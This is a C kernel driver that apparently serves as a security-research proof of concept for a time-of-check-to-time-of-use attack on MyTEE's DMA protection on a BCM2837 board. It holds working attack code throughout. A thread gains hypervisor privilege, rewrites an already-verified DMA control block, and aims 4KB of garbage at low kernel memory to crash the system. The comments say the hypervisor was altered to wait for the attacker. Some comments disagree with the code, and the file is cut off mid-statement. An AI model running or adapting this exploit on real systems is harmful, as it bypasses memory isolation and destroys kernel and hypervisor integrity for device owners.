/*
 * MyTEE TOCTOU Attack - Kernel Driver
 *
 * This driver demonstrates the TOCTOU vulnerability in MyTEE's
 * DMA secure buffer using deterministic shared-memory synchronization.
 *
 * ATTACK PRINCIPLE:
 * The hypervisor (hyp-stub.S) has been modified to use shared memory
 * handshake for synchronization. After DMA CB verification passes,
 * the hypervisor signals the attacker and waits for modification.
 *
 * DETERMINISTIC SYNC (not timing-based):
 * 1. Attacker arms attack, hypervisor sees TOCTOU_SYNC_FLAG_VIRT
 * 2. Victim triggers DMA → hypervisor copies & verifies CBs
 * 3. After verification, hypervisor sets TOCTOU_SYNC_STATE_HYP_READY
 * 4. Hypervisor WAITS for TOCTOU_SYNC_STATE_ATTACKER_DONE
 * 5. Attacker modifies CB in secure buffer
 * 6. Attacker sets TOCTOU_SYNC_STATE_ATTACKER_DONE
 * 7. Hypervisor continues → DMA executes modified CB
 *
 * Usage (built-in driver):
 *   1. Check status: cat /proc/mytee_toctou
 *   2. Trigger attack: echo "attack" > /proc/mytee_toctou
 *   3. Verify result: cat /proc/mytee_toctou
 *
 * Copyright (c) 2024 Security Research
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dma-mapping.h>
#include <linux/smp.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/io.h>

#ifdef CONFIG_MYTEE
#include <asm/mytee.h>
#endif

#define DRIVER_NAME "mytee_toctou"
#define PROC_NAME "mytee_toctou"

/* Secure buffer constants (from hyp-stub.S) */
#define SECURE_BUFFER_BASE_VIRT     0x8F1FB000
#define SECURE_BUFFER_BASE_PHYS     0x0F1FB000
#define SECURE_BUFFER_SIZE_PER_CORE 0x1000      /* 4KB per core */
#define CB_SIZE                     32          /* bytes per CB */
#define MAX_CBS_PER_CORE            128         /* 4KB / 32 = 128 */
#define NUM_CORES                   4

/* TOCTOU Synchronization - shared memory handshake (matches hyp-stub.S) */
#define TOCTOU_SYNC_FLAG_VIRT       0x8F200000
#define TOCTOU_SYNC_FLAG_PHYS       0x0F200000
#define TOCTOU_SYNC_STATE_HYP_READY     0xDEAD0001
#define TOCTOU_SYNC_STATE_ATTACKER_DONE 0xDEAD0002

/* DMA constants */
#define BCM2837_BUS_PHYS_OFFSET     0xC0000000
#define PHYS_TO_BUS(x)              ((x) | BCM2837_BUS_PHYS_OFFSET)
#define BUS_TO_PHYS(x)              ((x) & ~BCM2837_BUS_PHYS_OFFSET)

/* BCM2835 DMA Controller registers */
#define DMA_BASE_PHYS               0x3F007000
#define DMA_CHANNEL_SIZE            0x100
#define DMA_CS                      0x00    /* Control and Status */
#define DMA_CONBLK_AD               0x04    /* Control Block Address */
#define DMA_DEBUG                   0x20    /* Debug */

/* DMA CS register bits */
#define DMA_CS_RESET                (1 << 31)
#define DMA_CS_ABORT                (1 << 30)
#define DMA_CS_WAIT_FOR_WRITES      (1 << 28)
#define DMA_CS_ACTIVE               (1 << 0)
#define DMA_CS_END                  (1 << 1)
#define DMA_CS_INT                  (1 << 2)
#define DMA_CS_ERROR                (1 << 8)

/* Attack verification */
#define VERIFY_PATTERN              0xCAFEBABE
#define ATTACK_MARKER               0xDEADBEEF

/* DMA channel to use for attack (channel 5 is usually free) */
#define ATTACK_DMA_CHANNEL          5

/* Overflow CB count (>128 to overflow into next core) */
#define OVERFLOW_CB_COUNT           600

/*
 * Synchronization states for TOCTOU attack
 * 
 * DETERMINISTIC TOCTOU Attack Timeline (shared-memory handshake):
 * 
 *   Core 0 (Victim - Legitimate DMA)     Core 1 (Attacker - Malicious)
 *   ─────────────────────────────────    ─────────────────────────────
 *   
 *   1. Prepare CB chain (129 CBs)        Attacker arms, starts polling
 *   2. Trigger DMA write → HVC trap      
 *   3. Hypervisor copies CBs             
 *      └─ CB[128] overflows to Core1!    
 *   4. Hypervisor verifies all CBs       
 *   5. Verification PASSES               
 *   6. Hypervisor writes HYP_READY       ← Deterministic signal!
 *   7. Hypervisor WAITS in loop          Attacker detects HYP_READY
 *                                        ↓
 *                                        8. mytee_up_priv()
 *                                        9. Modify CB in secure buffer
 *                                        10. Write ATTACKER_DONE
 *                                        ↓
 *   11. Hypervisor sees ATTACKER_DONE    
 *   12. Continue to DMA execution        
 *   13. DMA executes MODIFIED CB!        ← Attack Success!
 *
 * KEY INSIGHT:
 * - No timing-based race condition - deterministic handshake
 * - Hypervisor WAITS for attacker to complete modification
 * - 100% success rate (no brute-force needed)
 */
#define SYNC_STATE_IDLE             0
#define SYNC_STATE_ATTACK_ARMED     1   /* Attacker is ready and polling */
#define SYNC_STATE_VICTIM_START     2   /* Victim starting DMA sequence */
#define SYNC_STATE_COMPLETE         4   /* Attack sequence complete */

/* DMA Control Block structure (matches BCM2835 hardware) */
struct dma_cb {
    u32 info;           /* Transfer information */
    u32 src;            /* Source address (bus) */
    u32 dst;            /* Destination address (bus) */
    u32 length;         /* Transfer length */
    u32 stride;         /* 2D stride */
    u32 next;           /* Next CB address (bus) or 0 */
    u32 pad[2];         /* Padding to 32 bytes */
};

/* Transfer info flags */
#define TI_WAIT_RESP    (1 << 3)    /* Wait for write response */
#define TI_D_INC        (1 << 4)    /* Destination increment */
#define TI_S_INC        (1 << 8)    /* Source increment */

/* Attack state */
static struct {
    /* Configuration */
    int target_core;            /* Core to inject CB into (default: 1) */
    int target_cb_index;        /* CB slot to inject (0 = first) */
    
    /* Memory resources */
    void *payload_buf;          /* Attack payload buffer (virt) */
    dma_addr_t payload_phys;    /* Attack payload (phys) */
    void *target_buf;           /* Target to overwrite (virt) */
    dma_addr_t target_phys;     /* Target address (phys) */
    
    /* CB chain for victim */
    struct dma_cb *cb_chain;    /* CB chain buffer */
    dma_addr_t cb_chain_phys;   /* CB chain physical address */
    
    /* Secure buffer access (mapped after mytee_up_priv) */
    void __iomem *secure_buf_base;
    
    /* TOCTOU sync flag (shared memory with hypervisor) */
    volatile u32 __iomem *sync_flag;
    
    /* DMA controller access */
    void __iomem *dma_base;
    
    /* Synchronization */
    atomic_t sync_state;        /* Driver-level sync state */
    struct task_struct *victim_thread;
    struct task_struct *attacker_thread;
    volatile int stop_threads;
    
    /* Timing measurements */
    u64 victim_copy_time;
    u64 victim_verify_time;
    u64 attacker_inject_time;
    u64 race_window_ns;
    
    /* Results */
    int attack_triggered;
    int injection_done;
    int dma_executed;
    u32 verify_result;
    u32 attack_success;
    int race_won;               /* Did attacker win the race? */
    
    /* Secure buffer snapshot */
    struct dma_cb injected_cb;
    struct dma_cb original_cb;  /* CB before attack */
} attack_state;

/*
 * Read CB from secure buffer (requires EL2 privilege)
 */
static void read_secure_cb(int core, int cb_index, struct dma_cb *cb_out)
{
    void __iomem *cb_addr;
    u32 *src, *dst;
    int i;
    
    cb_addr = attack_state.secure_buf_base + 
              (core * SECURE_BUFFER_SIZE_PER_CORE) +
              (cb_index * CB_SIZE);
    
    src = (u32 __iomem *)cb_addr;
    dst = (u32 *)cb_out;
    
    for (i = 0; i < 8; i++) {
        dst[i] = readl(&src[i]);
    }
}

/*
 * Write malicious CB to secure buffer (requires EL2 privilege)
 * This directly writes to the secure buffer that DMA will execute from.
 */
static void inject_malicious_cb(int core, int cb_index, 
                                 u32 dst_phys, u32 src_phys, u32 length)
{
    void __iomem *cb_addr;
    
    cb_addr = attack_state.secure_buf_base + 
              (core * SECURE_BUFFER_SIZE_PER_CORE) +
              (cb_index * CB_SIZE);
    
    /* Build valid DMA CB structure */
    writel(TI_S_INC | TI_D_INC | TI_WAIT_RESP, cb_addr + 0x00);  /* info */
    writel(PHYS_TO_BUS(src_phys), cb_addr + 0x04);               /* src */
    writel(PHYS_TO_BUS(dst_phys), cb_addr + 0x08);               /* dst */
    writel(length, cb_addr + 0x0C);                              /* length */
    writel(0, cb_addr + 0x10);                                   /* stride */
    writel(0, cb_addr + 0x14);                                   /* next = NULL */
    writel(0, cb_addr + 0x18);                                   /* pad */
    writel(0, cb_addr + 0x1C);                                   /* pad */
    
    wmb();  /* Ensure write completes */
}

/*
 * Execute DMA using the injected CB in secure buffer
 * This triggers the actual DMA transfer using our malicious CB
 */
static int execute_dma_from_secure_buffer(int core, int cb_index)
{
    void __iomem *chan_base;
    u32 cb_bus_addr;
    u32 cs;
    int timeout = 1000;
    
    /* Calculate the bus address of the CB in secure buffer */
    cb_bus_addr = PHYS_TO_BUS(SECURE_BUFFER_BASE_PHYS + 
                              (core * SECURE_BUFFER_SIZE_PER_CORE) +
                              (cb_index * CB_SIZE));
    
    pr_info("[TOCTOU] Executing DMA from secure buffer CB at bus=0x%08x\n", cb_bus_addr);
    
    /* Map DMA controller if not already mapped */
    if (!attack_state.dma_base) {
        attack_state.dma_base = ioremap(DMA_BASE_PHYS, 0x1000);
        if (!attack_state.dma_base) {
            pr_err("[TOCTOU] Failed to map DMA controller\n");
            return -ENOMEM;
        }
    }
    
    chan_base = attack_state.dma_base + (ATTACK_DMA_CHANNEL * DMA_CHANNEL_SIZE);
    
    /* Reset the DMA channel */
    writel(DMA_CS_RESET, chan_base + DMA_CS);
    udelay(10);
    
    /* Clear any pending status */
    writel(DMA_CS_END | DMA_CS_INT | DMA_CS_ERROR, chan_base + DMA_CS);
    
    /* Set the CB address */
    writel(cb_bus_addr, chan_base + DMA_CONBLK_AD);
    wmb();
    
    /* Start DMA */
    writel(DMA_CS_WAIT_FOR_WRITES | DMA_CS_ACTIVE, chan_base + DMA_CS);
    
    /* Wait for completion */
    while (timeout-- > 0) {
        cs = readl(chan_base + DMA_CS);
        if (!(cs & DMA_CS_ACTIVE))
            break;
        udelay(1);
    }
    
    cs = readl(chan_base + DMA_CS);
    
    if (cs & DMA_CS_ERROR) {
        pr_err("[TOCTOU] DMA error! CS=0x%08x\n", cs);
        return -EIO;
    }
    
    if (cs & DMA_CS_END) {
        pr_info("[TOCTOU] DMA completed successfully! CS=0x%08x\n", cs);
        attack_state.dma_executed = 1;
        return 0;
    }
    
    if (timeout <= 0) {
        pr_err("[TOCTOU] DMA timeout! CS=0x%08x\n", cs);
        return -ETIMEDOUT;
    }
    
    return 0;
}

/*
 * Victim thread - runs on Core 0
 * Triggers legitimate DMA that goes through hypervisor verification.
 * 
 * The hypervisor (hyp-stub.S) will:
 * 1. Copy CBs to secure buffer (causing overflow for 129 CBs)
 * 2. Verify all CBs pass address checks
 * 3. Signal HYP_READY to sync flag
 * 4. WAIT for ATTACKER_DONE signal
 * 5. Execute DMA with (now modified) CB
 */
static int victim_thread_fn(void *data)
{
    int i;
    ktime_t t_start, t_end;
    void __iomem *dma_reg;
    u32 cb_bus_addr;
    
    pr_info("[VICTIM] Thread started on Core %d\n", smp_processor_id());
    
    /* Wait for attack to be armed */
    while (!attack_state.stop_threads) {
        if (atomic_read(&attack_state.sync_state) != SYNC_STATE_ATTACK_ARMED) {
            msleep(10);
            continue;
        }
        
        pr_info("[VICTIM] Starting DMA sequence with %d CBs\n", OVERFLOW_CB_COUNT);
        atomic_set(&attack_state.sync_state, SYNC_STATE_VICTIM_START);
        wmb();
        
        /* Build CB chain - 129 CBs will overflow into Core 1's buffer */
        for (i = 0; i < OVERFLOW_CB_COUNT; i++) {
            struct dma_cb *cb = &attack_state.cb_chain[i];
            
            /* Legitimate CB: copy from payload to target */
            cb->info = TI_S_INC | TI_D_INC | TI_WAIT_RESP;
            cb->src = PHYS_TO_BUS(attack_state.payload_phys);
            cb->dst = PHYS_TO_BUS(attack_state.target_phys);
            cb->length = sizeof(u32);
            cb->stride = 0;
            cb->next = (i < OVERFLOW_CB_COUNT - 1) ? 
                       PHYS_TO_BUS(attack_state.cb_chain_phys + (i + 1) * sizeof(struct dma_cb)) : 0;
        }
        wmb();
        
        /*
         * Write first CB address to DMA controller.
         * This triggers HVC trap → hypervisor intercepts and verifies CBs.
         * 
         * Hypervisor flow (hyp-stub.S):
         * 1. Copy all 129 CBs to secure buffer (CB[128] overflows to Core1)
         * 2. Verify each CB's src/dst addresses
         * 3. Set sync_flag = HYP_READY
         * 4. Wait for sync_flag == ATTACKER_DONE (blocking!)
         * 5. Continue with DMA execution using modified secure buffer CB
         */
        t_start = ktime_get();
        
        /* Map DMA controller */
        if (!attack_state.dma_base) {
            attack_state.dma_base = ioremap(DMA_BASE_PHYS, 0x1000);
        }
        dma_reg = attack_state.dma_base + (ATTACK_DMA_CHANNEL * DMA_CHANNEL_SIZE);
        
        /* Calculate CB address */
        cb_bus_addr = PHYS_TO_BUS(attack_state.cb_chain_phys);
        
        pr_info("[VICTIM] Writing CB addr 0x%08x to DMA CONBLK_AD register\n", cb_bus_addr);
        pr_info("[VICTIM] This triggers HVC trap → hypervisor verification\n");
        pr_info("[VICTIM] Hypervisor will wait for attacker after verification!\n");
        
        /* Reset channel first */
        writel(DMA_CS_RESET, dma_reg + DMA_CS);
        udelay(10);
        writel(DMA_CS_END | DMA_CS_INT | DMA_CS_ERROR, dma_reg + DMA_CS);
        
        /* 
         * THIS WRITE triggers the hypervisor trap!
         * Hypervisor will copy, verify, signal, wait, then allow DMA.
         */
        writel(cb_bus_addr, dma_reg + DMA_CONBLK_AD);
        wmb();
        
        /* Start DMA - hypervisor has already waited for attacker */
        writel(DMA_CS_WAIT_FOR_WRITES | DMA_CS_ACTIVE, dma_reg + DMA_CS);
        
        /* Wait for DMA completion */
        {
            int timeout = 10000;
            u32 cs;
            while (timeout-- > 0) {
                cs = readl(dma_reg + DMA_CS);
                if (!(cs & DMA_CS_ACTIVE))
                    break;
                udelay(1);
            }
            
            t_end = ktime_get();
            attack_state.victim_copy_time = ktime_to_ns(ktime_sub(t_end, t_start));
            
            if (cs & DMA_CS_END) {
                pr_info("[VICTIM] DMA completed! Total time: %llu ns\n", 
                        attack_state.victim_copy_time);
                attack_state.dma_executed = 1;
            } else if (cs & DMA_CS_ERROR) {
                pr_err("[VICTIM] DMA error! CS=0x%08x\n", cs);
            } else {
                pr_err("[VICTIM] DMA timeout! CS=0x%08x\n", cs);
            }
        }
        
        atomic_set(&attack_state.sync_state, SYNC_STATE_COMPLETE);
        break;
    }
    
    pr_info("[VICTIM] Thread exiting\n");
    return 0;
}

/*
 * Attacker thread - runs on Core 1
 * Polls shared sync flag for HYP_READY, then modifies CB in secure buffer.
 * 
 * DETERMINISTIC ATTACK (no timing-based race):
 * 1. Poll sync_flag for HYP_READY signal from hypervisor
 * 2. When HYP_READY detected, hypervisor is WAITING for us
 * 3. Gain EL2 privilege with mytee_up_priv()
 * 4. Modify CB in secure buffer to point to protected region
 * 5. Set sync_flag = ATTACKER_DONE
 * 6. Hypervisor continues and DMA executes our modified CB
 */
static int attacker_thread_fn(void *data)
{
    ktime_t t_inject_start, t_inject_end;
    u32 sync_val;
    int poll_count = 0;
    
    pr_info("[ATTACKER] Thread started on Core %d\n", smp_processor_id());
    pr_info("[ATTACKER] Polling sync flag at 0x%08x for HYP_READY\n", 
            TOCTOU_SYNC_FLAG_VIRT);
    
#ifdef CONFIG_MYTEE
    /* Map sync flag with EL2 privilege */
    mytee_up_priv(MYTEE_UP_PRIV, 0, 0, 0);
    attack_state.sync_flag = (volatile u32 __iomem *)TOCTOU_SYNC_FLAG_VIRT;
    attack_state.secure_buf_base = (void __iomem *)SECURE_BUFFER_BASE_VIRT;
    
    /* Clear any stale sync flag */
    writel(0, (void __iomem *)attack_state.sync_flag);
    wmb();
    
    mytee_down_priv(MYTEE_DOWN_PRIV, 0);
    
    /* Wait for attack to be armed */
    while (!attack_state.stop_threads) {
        if (atomic_read(&attack_state.sync_state) < SYNC_STATE_ATTACK_ARMED) {
            msleep(10);
            continue;
        }
        
        pr_info("[ATTACKER] Attack armed, polling for hypervisor signal...\n");
        
        /* 
         * DETERMINISTIC POLLING:
         * Hypervisor sets HYP_READY AFTER verification passes.
         * Hypervisor then WAITS for ATTACKER_DONE.
         * This is NOT a race - it's a guaranteed handshake!
         */
        while (!attack_state.stop_threads) {
            mytee_up_priv(MYTEE_UP_PRIV, 0, 0, 0);
            
            sync_val = readl((void __iomem *)attack_state.sync_flag);
            
            if (sync_val == TOCTOU_SYNC_STATE_HYP_READY) {
                t_inject_start = ktime_get();
                
                pr_info("[ATTACKER] *** HYP_READY detected! Hypervisor is waiting! ***\n");
                
                /* Read original CB before modification */
                read_secure_cb(0, 0, &attack_state.original_cb);
                pr_info("[ATTACKER] Original CB[0]: info=0x%08x src=0x%08x dst=0x%08x\n",
                        attack_state.original_cb.info,
                        attack_state.original_cb.src,
                        attack_state.original_cb.dst);
                
                /* 
                 * INJECT MALICIOUS CB - DESTRUCTIVE ATTACK!
                 * Overwrite critical kernel memory to cause immediate crash.
                 * 
                 * Target options:
                 * - 0x00200000: Kernel text start (code corruption = crash)
                 * - 0x00008000: Kernel page tables
                 * - 0x0E800000: Hypervisor code
                 * 
                 * Writing garbage here WILL crash the system immediately,
                 * proving we bypassed the DMA filter!
                 */
                
                /* Target: Write 4KB of garbage to kernel text start! */
                u32 forbidden_target = 0x00008000;  /* Kernel entry point / low mem */
                
                pr_info("[ATTACKER] *** DESTRUCTIVE ATTACK INITIATED! ***\n");
                pr_info("[ATTACKER] Target: 0x%08x (LOW KERNEL MEMORY)\n", forbidden_target);
                pr_info("[ATTACKER] Writing 4KB garbage - SYSTEM WILL CRASH!\n");
                
                /* Inject CB that writes 4KB to low kernel memory */
                inject_malicious_cb(0, 0,  /* Core 0, CB index 0 (first CB) */
                                   forbidden_target,                  /* CRASH TARGET! */
                                   attack_state.payload_phys,         /* garbage data */
                                   4096);                             /* 4KB = max damage */
                
                /* Read back to confirm modification */
                read_secure_cb(0, 0, &attack_state.injected_cb);
                pr_info("[ATTACKER] Modified CB[0]: info=0x%08x src=0x%08x dst=0x%08x\n",
                        attack_state.injected_cb.info,
                        attack_state.injected_cb.src,
                        attack_state.injected_cb.dst);
                
                attack_state.injection_done = 1;
                attack_state.race_won = 1;
                
                /* Signal hypervisor that modification is complete */
                pr_info("[ATTACKER] Setting ATTACKER_DONE signal\n");
                writel(TOCTOU_SYNC_STATE_ATTACKER_DONE, 
                       (void __iomem *)attack_state.sync_flag);
                wmb();
                /* Data synchronization barrier - ensure write completes */
                asm volatile("dsb" ::: "memory");
                
                t_inject_end = ktime_get();
                attack_state.attacker_inject_time = 
                    ktime_to_ns(ktime_sub(t_inject_end, t_inject_start));
                
                mytee_down_priv(MYTEE_DOWN_PRIV, 0);
                
                pr_info("[ATTACKER] *** INJECTION SUCCESSFUL! ***\n");
                pr_info("[ATTACKER] Injection took %llu ns\n", 
                        attack_state.attacker_inject_time);
                pr_info("[ATTACKER] Hypervisor will now execute modified CB!\n");
                
                goto done;
            }
            
            mytee_down_priv(MYTEE_DOWN_PRIV, 0);
            
            poll_count++;
            if (poll_count % 100000 == 0) {
                pr_info("[ATTACKER] Polled %d times, sync_val=0x%08x\n", 
                        poll_count, sync_val);
            }
            
            /* Check if attack sequence completed without us */
            if (atomic_read(&attack_state.sync_state) >= SYNC_STATE_COMPLETE) {
                pr_info("[ATTACKER] Sequence completed without injection\n");
                goto done;
            }
            
            cpu_relax();
        }
    }
    
done:
#endif
    
    pr_info("[ATTACKER] Thread exiting (polled %d times)\n", poll_count);
    return 0;
}

/*
 * Perform the TOCTOU attack with proper multi-core synchronization
 */
static int do_attack(void)
{
    u32 *payload;
    u32 *target;
    int timeout;
    
    pr_info("[TOCTOU] ========================================\n");
    pr_info("[TOCTOU] Starting TOCTOU Attack with Shared Memory Sync\n");
    pr_info("[TOCTOU] ========================================\n");
    pr_info("[TOCTOU] \n");
    pr_info("[TOCTOU] VULNERABILITY BEING DEMONSTRATED:\n");
    pr_info("[TOCTOU] 1. Hypervisor verifies CB addresses before DMA\n");
    pr_info("[TOCTOU] 2. After verification, hypervisor signals and WAITS\n");
    pr_info("[TOCTOU] 3. Attacker modifies CB using mytee_up_priv()\n");
    pr_info("[TOCTOU] 4. DMA executes MODIFIED CB (bypasses verification!)\n");
    pr_info("[TOCTOU] \n");
    pr_info("[TOCTOU] Sync flag address: 0x%08x\n", TOCTOU_SYNC_FLAG_VIRT);
    pr_info("[TOCTOU] \n");
    
    /* Clear previous results */
    attack_state.attack_triggered = 0;
    attack_state.injection_done = 0;
    attack_state.dma_executed = 0;
    attack_state.verify_result = 0;
    attack_state.attack_success = 0;
    attack_state.race_won = 0;
    attack_state.stop_threads = 0;
    attack_state.victim_copy_time = 0;
    attack_state.victim_verify_time = 0;
    attack_state.attacker_inject_time = 0;
    attack_state.race_window_ns = 0;
    memset(&attack_state.injected_cb, 0, sizeof(attack_state.injected_cb));
    memset(&attack_state.original_cb, 0, sizeof(attack_state.original_cb));
    atomic_set(&attack_state.sync_state, SYNC_STATE_IDLE);
    
    /* Prepare payload with attack pattern */
    payload = (u32 *)attack_state.payload_buf;
    payload[0] = VERIFY_PATTERN;
    payload[1] = ATTACK_MARKER;
    wmb();
    
    /* Clear target buffer */
    target = (u32 *)attack_state.target_buf;
    target[0] = 0x12345678;  /* Known value before attack */
    wmb();
    
    pr_info("[TOCTOU] Payload phys=0x%llx value=0x%08x\n",
            (u64)attack_state.payload_phys, payload[0]);
    pr_info("[TOCTOU] Target phys=0x%llx before=0x%08x\n",
            (u64)attack_state.target_phys, target[0]);
    
    /* Create victim thread on Core 0 */
    attack_state.victim_thread = kthread_create(victim_thread_fn, NULL, "toctou_victim");
    if (IS_ERR(attack_state.victim_thread)) {
        pr_err("[TOCTOU] Failed to create victim thread\n");
        return PTR_ERR(attack_state.victim_thread);
    }
    kthread_bind(attack_state.victim_thread, 0);
    
    /* Create attacker thread on Core 1 */
    attack_state.attacker_thread = kthread_create(attacker_thread_fn, NULL, "toctou_attacker");
    if (IS_ERR(attack_state.attacker_thread)) {
        pr_err("[TOCTOU] Failed to create attacker thread\n");
        kthread_stop(attack_state.victim_thread);
        return PTR_ERR(attack_state.attacker_thread);
    }
    kthread_bind(attack_state.attacker_thread, 1);
    
    pr_info("[TOCTOU] Threads: Victim->Core0, Attacker->Core1\n");
    pr_info("[TOCTOU] Attacker will poll sync flag for HYP_READY\n");
    
    /* Start attacker first (it will poll sync flag) */
    wake_up_process(attack_state.attacker_thread);
    msleep(100);  /* Let attacker start polling */
    
    /* Arm the attack */
    atomic_set(&attack_state.sync_state, SYNC_STATE_ATTACK_ARMED);
    wmb();
    
    /* Start victim - triggers DMA → hypervisor verification → sync handshake */
    wake_up_process(attack_state.victim_thread);
    
    pr_info("[TOCTOU] Victim triggering DMA, attacker polling...\n");
    
    /* Wait for completion */
    timeout = 5000;  /* 5 second timeout */
    while (timeout-- > 0) {
        if (atomic_read(&attack_state.sync_state) == SYNC_STATE_COMPLETE)
            break;
        msleep(1);
    }
    
    attack_state.stop_threads = 1;
    wmb();
    
    /* Give threads time to exit */
    msleep(100);
    
    attack_state.attack_triggered = 1;
    
    /* Check results */
    rmb();
    attack_state.verify_result = target[0];
    
    pr_info("[TOCTOU] ========================================\n");
    pr_info("[TOCTOU] ATTACK RESULTS\n");
    pr_info("[TOCTOU] ========================================\n");
    pr_info("[TOCTOU] Deterministic handshake: %s\n", 
            attack_state.race_won ? "SUCCESS" : "FAILED");
    pr_info("[TOCTOU] CB injection done: %s\n",
            attack_state.injection_done ? "YES" : "NO");
    pr_info("[TOCTOU] DMA executed: %s\n",
            attack_state.dma_executed ? "YES" : "NO");
    pr_info("[TOCTOU] Timing:\n");
    pr_info("[TOCTOU]   Victim DMA sequence: %llu ns\n", attack_state.victim_copy_time);
    pr_info("[TOCTOU]   Attacker inject: %llu ns\n", attack_state.attacker_inject_time);
    
    if (attack_state.original_cb.info != 0) {
        pr_info("[TOCTOU] Original CB (before attack):\n");
        pr_info("[TOCTOU]   info=0x%08x dst=0x%08x\n",
                attack_state.original_cb.info, attack_state.original_cb.dst);
    }
    
    if (attack_state.injection_done) {
        pr_info("[TOCTOU] Injected CB (after attack):\n");
        pr_info("[TOCTOU]   info=0x%08x dst=0x%08x\n",
                attack_state.injected_cb.info, attack_state.injected_cb.dst);
        
        /* Check if we targeted forbidden region */
        u32 injected_dst = BUS_TO_PHYS(attack_state.injected_cb.dst);
        if (injected_dst >= 0x00200000 && injected_dst < 0x00A00000) {
            pr_info("[TOCTOU] *** TARGET: KERNEL TEXT REGION (0x%08x) ***\n", injected_dst);
        } else if (injected_dst >= 0x0E800000 && injected_dst < 0x11000000) {
            pr_info("[TOCTOU] *** TARGET: HYP/EL3/OPTEE REGION (0x%08x) ***\n", injected_dst);
        }
    }
    
    pr_info("[TOCTOU] Target value: 0x%08x (expected: 0x%08x)\n",
            attack_state.verify_result, VERIFY_PATTERN);
    
    /* Correct success check: must have injection_done AND race_won */
    if (attack_state.race_won && attack_state.injection_done) {
        attack_state.attack_success = 1;
        pr_info("[TOCTOU] ****************************************\n");
        pr_info("[TOCTOU] *** TOCTOU ATTACK SUCCESSFUL! ***\n");
        pr_info("[TOCTOU] *** DMA FILTER BYPASSED! ***\n");
        pr_info("[TOCTOU] ****************************************\n");
        pr_info("[TOCTOU] CB was modified AFTER verification passed.\n");
        pr_info("[TOCTOU] DMA now targets FORBIDDEN memory region!\n");
        pr_info("[TOCTOU] Original dst: 0x%08x (allowed)\n", attack_state.original_cb.dst);
        pr_info("[TOCTOU] Injected dst: 0x%08x (FORBIDDEN!)\n", attack_state.injected_cb.dst);
    } else if (attack_state.verify_result == VERIFY_PATTERN && !attack_state.injection_done) {
        pr_info("[TOCTOU] ****************************************\n");
        pr_info("[TOCTOU] NOTE: DMA succeeded but NO CB injection!\n");
        pr_info("[TOCTOU] Handshake failed - HYP_READY not received.\n");
        pr_info("[TOCTOU] Hypervisor may not have triggered sync point.\n");
        pr_info("[TOCTOU] ****************************************\n");
    } else {
        pr_info("[TOCTOU] Attack did not complete.\n");
        pr_info("[TOCTOU] Check kernel logs for details.\n");
    }
    
    return 0;
}

/*
 * Dump secure buffer content (SAFE version - no actual memory access)
 * Previous version caused hangs due to improper EL2 memory access.
 */
static int dump_secure_buffer(struct seq_file *m, int core, int start_cb, int count)
{
#ifdef CONFIG_MYTEE
    seq_printf(m, "\nCore %d Secure Buffer (CB %d-%d):\n", 
               core, start_cb, start_cb + count - 1);
    seq_printf(m, "  [Dump disabled - causes system hang]\n");
    seq_printf(m, "  Use dmesg to see attack results instead.\n");
    
    /* Note: Direct secure buffer access via seq_file causes hangs.
     * The mytee_up_priv/down_priv cycle in seq_file context is unstable.
     * Attack results are logged via pr_info instead.
     */
#endif
    return 0;
}

/*
 * Proc file read handler
 */
static int toctou_proc_show(struct seq_file *m, void *v)
{
    seq_printf(m, "=== MyTEE TOCTOU Attack Status ===\n\n");
    
#ifndef CONFIG_MYTEE
    seq_printf(m, "ERROR: CONFIG_MYTEE not enabled!\n");
    seq_printf(m, "This driver requires MyTEE to be enabled.\n\n");
    return 0;
#endif
    
    seq_printf(m, "Vulnerability Description:\n");
    seq_printf(m, "  Hypervisor verifies CB addresses before DMA execution.\n");
    seq_printf(m, "  TOCTOU: Attacker modifies CB AFTER verification passes.\n");
    seq_printf(m, "  Uses deterministic shared-memory handshake (no brute-force).\n\n");
    
    seq_printf(m, "Sync Mechanism:\n");
    seq_printf(m, "  Sync flag address: 0x%08x (virt) / 0x%08x (phys)\n",
               TOCTOU_SYNC_FLAG_VIRT, TOCTOU_SYNC_FLAG_PHYS);
    seq_printf(m, "  HYP_READY signal:  0x%08x\n", TOCTOU_SYNC_STATE_HYP_READY);
    seq_printf(m, "  ATTACKER_DONE:     0x%08x\n\n", TOCTOU_SYNC_STATE_ATTACKER_DONE);
    
    seq_printf(m, "Secure Buffer Layout:\n");
    seq_printf(m, "  Base: 0x%08x (phys) / 0x%08x (virt)\n",
               SECURE_BUFFER_BASE_PHYS, SECURE_BUFFER_BASE_VIRT);
    seq_printf(m, "  Core 0: 0x%08x - 0x%08x\n",
               SECURE_BUFFER_BASE_PHYS,
               SECURE_BUFFER_BASE_PHYS + SECURE_BUFFER_SIZE_PER_CORE - 1);
    seq_printf(m, "  Core 1: 0x%08x - 0x%08x\n",
               SECURE_BUFFER_BASE_PHYS + SECURE_BUFFER_SIZE_PER_CORE,
               SECURE_BUFFER_BASE_PHYS + 2*SECURE_BUFFER_SIZE_PER_CORE - 1);
    seq_printf(m, "  Core 2: 0x%08x - 0x%08x\n",
               SECURE_BUFFER_BASE_PHYS + 2*SECURE_BUFFER_SIZE_PER_CORE,
               SECURE_BUFFER_BASE_PHYS + 3*SECURE_BUFFER_SIZE_PER_CORE - 1);
    seq_printf(m, "  Core 3: 0x%08x - 0x%08x\n\n",
               SECURE_BUFFER_BASE_PHYS + 3*SECURE_BUFFER_SIZE_PER_CORE,
               SECURE_BUFFER_BASE_PHYS + 4*SECURE_BUFFER_SIZE_PER_CORE - 1);
    
    seq_printf(m, "Attack Configuration:\n");
    seq_printf(m, "  Target core: %d\n", attack_state.target_core);
    seq_printf(m, "  Target CB index: %d\n", attack_state.target_cb_index);
    seq_printf(m, "  Payload phys: 0x%llx\n", (u64)attack_state.payload_phys);
    seq_printf(m, "  Target phys: 0x%llx\n\n", (u64)attack_state.target_phys);
    
    seq_printf(m, "Attack Results:\n");
    seq_printf(m, "  Attack triggered: %s\n", 
               attack_state.attack_triggered ? "YES" : "NO");
    seq_printf(m, "  Handshake success: %s\n",
               attack_state.race_won ? "YES" : "NO");
    seq_printf(m, "  CB injected: %s\n", 
               attack_state.injection_done ? "YES" : "NO");
    seq_printf(m, "  DMA executed: %s\n",
               attack_state.dma_executed ? "YES" : "NO");
    seq_printf(m, "  Verify value: 0x%08x (expected: 0x%08x)\n", 
               attack_state.verify_result, VERIFY_PATTERN);
    seq_printf(m, "  Attack success: %s\n\n", 
               attack_state.attack_success ? 
